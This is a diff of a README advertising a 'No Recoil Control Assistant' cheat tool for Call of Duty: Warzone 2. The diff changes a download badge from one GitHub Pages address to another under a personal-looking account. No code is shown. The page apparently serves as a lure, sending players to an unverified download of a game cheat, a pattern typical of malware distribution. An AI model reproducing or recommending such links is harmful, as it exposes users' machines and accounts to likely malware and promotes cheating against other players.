@@ -3,7 +3,7 @@
 Set up the **No Recoil Control Assistant** for Call of Duty: Warzone 2 on PC. This technical guide helps you minimize recoil drift, stabilize spray patterns, and optimize weapon handling for accurate shots in any combat scenario.
 
 ⬇️ **Download**  
-[![Download Recoil Control Tool](https://img.shields.io/badge/Download-Recoil_Control-000000?style=for-the-badge&logo=call-of-duty&logoColor=white)](https://warzone-2-no-recoil-control.github.io/.github/)
+[![Download Recoil Control Tool](https://img.shields.io/badge/Download-Recoil_Control-000000?style=for-the-badge&logo=call-of-duty&logoColor=white)](https://marianna51preston.github.io/.github/warzone-2-no-recoil-control)
 
 ---
 
